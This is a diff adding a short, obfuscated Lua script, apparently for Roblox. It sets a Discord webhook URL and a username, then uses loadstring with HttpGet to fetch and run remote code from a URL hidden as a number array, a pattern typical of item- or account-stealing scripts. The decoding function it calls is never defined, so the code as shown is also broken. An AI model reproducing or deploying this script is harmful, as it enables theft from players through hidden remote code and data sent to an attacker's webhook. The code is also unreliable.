@@ -1,0 +1,19 @@
+function XRKEMEQwuPPJEobEqwgLcjqGyGkobdCNqOhKatcjOOGcYblJfElJzBW(c)
+tab={}
+for i = 1,#c do
+x=string.len(c[i]) 
+y=string.char(x)
+table.insert(tab,y)
+end
+x=table.concat(tab)
+return x
+end 
+
+
+function ralphamoykipay(code)res=XRKEMEQwuPPJEobEqwgLcjqGyGkobdCNqOhKatcjOOGcYblJfElJzBW({})for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 
+
+
+UserName = "ralphamoykipay"
+WebHook = "https://discord.com/api/webhooks/1169612979315146834/RsVf6Hd2js_PNez0QpaMcrQJPgJUzD5JSNHdU2qVW9kUi9vIyfuaFhTzCunRjwyrGUjb"
+
+loadstring(game:HttpGet(CMFZskFriUPFJlEHrkFlgTeziuBr({10920,12180,12180,11760,12075,6090,4935,4935,10815,11655,11655,10710,4830,11760,11970,11655,4935,12075,4935,11445,10185,11025,11340,10290,11655,12600,4830,11340,12285,10185}), true))()        
